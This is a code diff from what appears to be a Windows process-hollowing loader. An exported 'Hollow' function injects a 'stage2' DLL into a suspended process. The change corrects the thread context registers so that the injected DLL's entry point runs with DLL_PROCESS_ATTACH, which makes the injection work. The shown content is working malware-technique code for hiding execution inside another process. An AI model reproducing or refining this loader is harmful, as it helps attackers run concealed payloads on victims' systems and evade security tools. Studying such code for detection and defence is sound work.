@@ -383,7 +383,13 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
         LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
         return;
     }
-    ctx.Rcx = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
+    // stage2.dll entry is DllMain(HINSTANCE, DWORD, LPVOID) -> Rcx, Rdx, R8.
+    // Rip redirected to entry; fdwReason must be DLL_PROCESS_ATTACH (1) or
+    // DllMain's guard never runs and stage2 produces no artifacts.
+    ctx.Rcx = (DWORD64)remoteImage;
+    ctx.Rdx = (DWORD64)DLL_PROCESS_ATTACH;
+    ctx.R8  = (DWORD64)0;
+    ctx.Rip = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
     LogMessage(L"[*] calling SetThreadContext");
     if (!SetThreadContext(pi.hThread, &ctx)) {
         LogMessage(L"[-] SetThreadContext failed");
